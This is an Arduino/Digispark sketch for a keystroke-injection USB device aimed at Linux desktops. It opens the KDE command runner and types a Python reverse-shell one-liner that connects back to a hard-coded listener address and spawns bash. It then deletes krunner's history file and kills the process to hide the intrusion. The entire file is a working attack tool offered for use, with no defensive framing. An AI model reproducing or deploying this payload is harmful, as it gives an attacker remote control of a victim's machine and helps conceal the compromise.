#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.delay(500);
  // Open Krunner/Application Finder/Command runner (Linux equivelent of WIN+R)
  DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
  // Define LHOST & LPORT
  DigiKeyboard.print("LHOST='192.168.0.189'; LPORT='68'");
  // Payload (Reverse Shell in this case)
  DigiKeyboard.print("python3 -c \"import os,pty,socket;s=socket.socket();s.connect((\"$LHOST\", $LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")\" &");
  // Clean up (clear command history)
  DigiKeyboard.println("rm -rf ~/.local/share/krunnerstaterc; pkill krunner");
  
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
